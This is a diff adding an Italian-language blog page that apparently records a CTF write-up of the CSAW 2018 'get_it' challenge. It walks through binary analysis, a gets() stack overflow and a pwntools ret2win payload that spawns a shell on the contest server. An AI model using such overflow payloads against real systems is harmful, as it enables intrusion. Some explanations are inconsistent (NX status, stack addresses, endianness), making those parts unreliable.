@@ -1,0 +1,187 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+<meta charset="utf-8">
+<meta name="description" content="">
+<meta name="generator" content="Hugo 0.51" />
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="stylesheet" href="/css/style.css" type="text/css">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Code+Pro:400,700" type="text/css">
+<link rel="alternate" href="/index.xml" type="application/rss+xml" title="R13">
+<title>CSAW 2018 - get_it - R13</title>
+</head>
+<body>
+
+<header>
+  <div class="container clearfix">
+    <a class="path" href="https://rad-13.github.io/">[R13]</a>
+    <span class="caret"># _</span>
+    <div class="right">
+      
+    </div>
+  </div>
+</header>
+
+<div class="container">
+
+
+<main role="main" class="article">
+  
+<article class="single" itemscope itemtype="http://schema.org/BlogPosting">
+  <div class="meta">
+
+    <span class="key">published on</span>
+    <span class="val"><time itemprop="datePublished" datetime="2018-11-27">November 27, 2018</time></span>
+
+
+    <span class="key">in</span>
+    <span class="val">
+
+        <a href="/categories/ctf">ctf</a>
+
+    </span>
+
+
+    <br>
+    <span class="key">tags:</span>
+    <span class="val">
+
+        <a href="/tags/CSAW">CSAW</a>
+
+        <a href="/tags/pwn">pwn</a>
+
+    </span>
+
+  </div>
+  <h1 class="headline" itemprop="headline">CSAW 2018 - get_it</h1>
+  <section class="body" itemprop="articleBody">
+    <p>_get<em>it</em> è la prima sfida offerta nella categoria pwning delle per la CSAW 2018 (qualificazioni).<br />
+Il binario fornito è un ELF64. <a href="https://srv-file1.gofile.io/download/bmbtyU/81070e096908e2bf4ac4345529afb91e/get-it">Download</a><br />
+Appena scaricato possiamo analizzarlo utilizzano <a href="https://r2wiki.readthedocs.io/en/latest/tools/rabin2/">rabin2</a>, un tool molto utile al fine di ottenere informazioni su un binario.
+Passando il parametro -I (binary info) otteniamo il seguente output:</p>
+<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">arch     x86
+baddr    0x400000
+binsz    6754
+bintype  elf
+bits     64
+canary   false
+sanitiz  false
+class    ELF64
+crypto   false
+endian   little
+havecode true
+intrp    /lib64/ld-linux-x86-64.so.2
+lang     c
+linenum  true
+lsyms    true
+machine  AMD x86-64 architecture
+maxopsz  16
+minopsz  1
+nx       true
+os       linux
+pcalign  0
+pic      false
+relocs   true
+relro    partial
+rpath    NONE
+static   false
+stripped false
+subsys   linux
+va       true</code></pre></div>
+<p>I due parametri principali da notare sono:</p>
+
+<ul>
+<li>canary;</li>
+<li>nx.</li>
+</ul>
+
+<p>I canary sono una tecnica di difesa contro attacchi di tipo buffer overflow, essi consistono nell&rsquo;inserire sullo stack dei valori randomici. Al termine di ogni funzione verrà poi aggiunto un controllo di integrità su tali valori, se l&rsquo;indirizzo di ritorno è stato sovvrascritto viene lanciato un errore <strong>stack smashing detected</strong> ed il programma si chiude.<br />
+Il fatto che i canarini non siano attivi fa supporre che ci sia la possibilità di buffer overflow.<br />
+NX (Not Executable) è invece un ulteriore tecnica di difesa, questa volta contro un attacco del tipo arbitrary code execution. Nello stack ci sono i dati utili per un eseguibile (variabili, array, indirizzi di ritorno, backup di registri ed altro), risulterebbe quindi assai strano che del codice eseguibile si trovi in tale area. Il sistema operativo marca quindi tale zona di memoria come NON eseguibile, e se cerchiamo di spostare l&rsquo;instruction pointer sullo stack il programam viene interrotto.<br />
+Dato che NX è a false (stack non eseguibile) si suppone che non sia possibile inserire uno shellcode nel programma.<br />
+Eseguendo il binario l&rsquo;outpu è il seguente:</p>
+<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">Do you gets it??</code></pre></div>
+<p>Dopodichè esso rimane in attesa di un input da parte dell&rsquo;utente, se per caso inseriamo una stringa molto lunga il programma va in crash, l&rsquo;idea di un buffer overflow è sempre più che confermata.<br />
+Analizzando l&rsquo;esecuzione del programma tramite ltrace, tool molto utile al fine di tracciare le chiamate a funzioni di libreria effettuate dal programma.<br />
+Lanciando il comando:</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">python -c <span class="s2">&#34;print(&#39;A&#39;*50)&#34;</span> <span class="p">|</span> ltrace ./get_it</code></pre></div>
+<p>Otteniamo le seguenti informazioni:</p>
+<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">__libc_start_main(0x4005c7, 1, 0x7ffe572d3398, 0x400600 &lt;unfinished ...&gt;
+puts(&#34;Do you gets it??&#34;Do you gets it??) = 17
+gets(0x7ffe572d3290, 0x17b5260, 0x7fc7d770d720, 0x7fc7d7639818) = 0x7ffe572d3290
+--- SIGSEGV (Segmentation fault) ---
++++ killed by SIGSEGV +++</code></pre></div>
+<p>La chiamata a libreria usata è una <a href="http://www.cplusplus.com/reference/cstdio/gets/">gets</a><br />
+Non resta che aprire il programma tramite radare2:</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">radare2 -AAA ./get_it</code></pre></div>
+<p>La funzione main si trova all&rsquo;indirizzo 0x004005c7 ed il suo codice è:</p>
+<div class="highlight"><pre class="chroma"><code class="language-asm" data-lang="asm"><span class="nf">push</span> <span class="no">rbp</span>
+<span class="nf">mov</span> <span class="no">rbp</span><span class="p">,</span> <span class="no">rsp</span>                
+<span class="no">sub</span> <span class="no">rsp</span><span class="p">,</span> <span class="mi">0x30</span>               <span class="c">; &#39;0&#39;
+</span><span class="c"></span><span class="no">mov</span> <span class="no">dword</span> <span class="p">[</span><span class="no">local_24h</span><span class="p">],</span> <span class="no">edi</span>  <span class="c">; argc
+</span><span class="c"></span><span class="no">mov</span> <span class="no">qword</span> <span class="p">[</span><span class="no">local_30h</span><span class="p">],</span> <span class="no">rsi</span>  <span class="c">; argv
+</span><span class="c"></span><span class="no">mov</span> <span class="no">edi</span><span class="p">,</span> <span class="no">str.Do_you_gets_it</span> <span class="c">; 0x40068e ; &#34;Do you gets it??&#34; ; const char *s
+</span><span class="c"></span><span class="no">call</span> <span class="no">sym.imp.puts</span>           <span class="c">; int puts(const char *s)
+</span><span class="c"></span><span class="no">lea</span> <span class="no">rax</span><span class="p">,</span> <span class="no">qword</span> <span class="p">[</span><span class="no">s</span><span class="p">]</span>          
+<span class="no">mov</span> <span class="no">rdi</span><span class="p">,</span> <span class="no">rax</span>                <span class="c">; char *s
+</span><span class="c"></span><span class="no">mov</span> <span class="no">eax</span><span class="p">,</span> <span class="mi">0</span>                  
+<span class="no">call</span> <span class="no">sym.imp.gets</span>           <span class="c">; char *gets(char *s)
+</span><span class="c"></span><span class="no">mov</span> <span class="no">eax</span><span class="p">,</span> <span class="mi">0</span>                  
+<span class="no">leave</span>                              
+<span class="no">ret</span>                                  </code></pre></div>
+<p><code>char *s</code> si trova ad ebp-0x20, essa è la variabile locale dove viene allocato l&rsquo;input letto da gets.<br />
+Il programma quindi crasha poichè l&rsquo;indirizzo di ritorno della funzione main viene sovvrascritto dall&rsquo;input fornito dall&rsquo;utente tramite la gets.
+Se eseguiamo ora il programma selezionando l&rsquo;opzione -D di radare2 (debug), possiamo notare che poco dopo la gets la situazione dello stack è:</p>
+
+<ul>
+<li>char* s @ 0x7ffffe9d63c0;</li>
+<li>indirizzo di ritorno @ 0x7ffffe9d63c0.</li>
+</ul>
+
+<p>La distanza tra i due indirizzi è di 40byte, questo è il valore massimo prima che l&rsquo;indirizzo di ritorno venga sovvrascritto.<br />
+La cosa importante da notare è che a seguito dei 40byte è presente l&rsquo;indirizzo di ritorno (lungo 8 byte), sovrascrivendolo potremo spostare l&rsquo;esecuzione dove vogliamo all&rsquo;interno del programma.<br />
+Come abbiamo già notato prima l&rsquo;NX è attivo, non è quindi possibile inserire uno shellcode all&rsquo;interno dello stack ed eseguirlo, ma analizzando le funzioni con radare2 se ne trova una molto utile a riguardo, si trova all&rsquo;indirizzo 0x004005b6 ed il suo nome è <strong>give_shell()</strong>:</p>
+<div class="highlight"><pre class="chroma"><code class="language-asm" data-lang="asm"><span class="err">0</span><span class="nf">x004005b6</span>  <span class="no">push</span> <span class="no">rbp</span>      
+<span class="mi">0x004005b7</span>  <span class="no">mov</span> <span class="no">rbp</span><span class="p">,</span> <span class="no">rsp</span>      
+<span class="mi">0x004005ba</span>  <span class="no">mov</span> <span class="no">edi</span><span class="p">,</span> <span class="no">str.bin_bash</span> <span class="c">; 0x400684 ; &#34;/bin/bash&#34;
+</span><span class="c"></span><span class="mi">0x004005bf</span>  <span class="no">call</span> <span class="no">sym.imp.system</span>   <span class="c">;int system(const char *string)
+</span><span class="c"></span><span class="mi">0x004005c4</span>  <span class="no">nop</span>      
+<span class="mi">0x004005c5</span>  <span class="no">pop</span> <span class="no">rbp</span>      
+<span class="mi">0x004005c6</span>  <span class="no">ret</span></code></pre></div>
+<p>Tale funzione non è altro che una chiamata alla funzione di libreria <a href="https://linux.die.net/man/3/system">system(3)</a>, il parametro passato ad essa è <code>/bin/bash</code>, in pratica apre una shell.<br />
+Sono ora da notare due cose molto importanti:</p>
+
+<ol>
+<li>Ci troviamo in un architettura little endian, i valori vengono inseriti &ldquo;al contrario&rdquo; nello stack, quindi l&rsquo;indirizzo 0x004005b6 deve diventare 0xb6054000;</li>
+<li>Gli indirizzi essendo l&rsquo;architettura a 64bit solo di 8byte, bisogna quindi inserire 4 zeri in fondo all&rsquo;indirizzo di ritorno, facendolo quindi diventare 0xb60540000000 che inserito nello stack sarà 0x0000004005b6.
+Il codice prodotto è dunque il seguente:</li>
+</ol>
+<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mi">40</span><span class="o">+</span><span class="s2">&#34;</span><span class="se">\xb6\x05\x40\x00</span><span class="s2">&#34;</span><span class="o">+</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="o">*</span><span class="mi">4</span>
+
+<span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;pwn.chal.csaw.io&#39;</span><span class="p">,</span><span class="mi">9001</span><span class="p">)</span>
+
+<span class="k">print</span> <span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
+<span class="k">print</span><span class="p">(</span><span class="s2">&#34;SENDING PAYLOAD AND OPENING A SHELL&#34;</span><span class="p">)</span>
+<span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></code></pre></div>
+<p>Aperta la shell possiamo ottenere la flag tramite un semplice <code>cat flag.txt</code>:</p>
+<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">flag{y0u_deF_get_itls}</code></pre></div>
+  </section>
+</article>
+
+</main>
+
+</div>
+
+<footer>
+  <div class="container">
+    <span class="copyright">&copy; 2018 R13 - <a rel="license" href="http://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a></span>
+  </div>
+</footer>
+
+</body>
+</html>
+
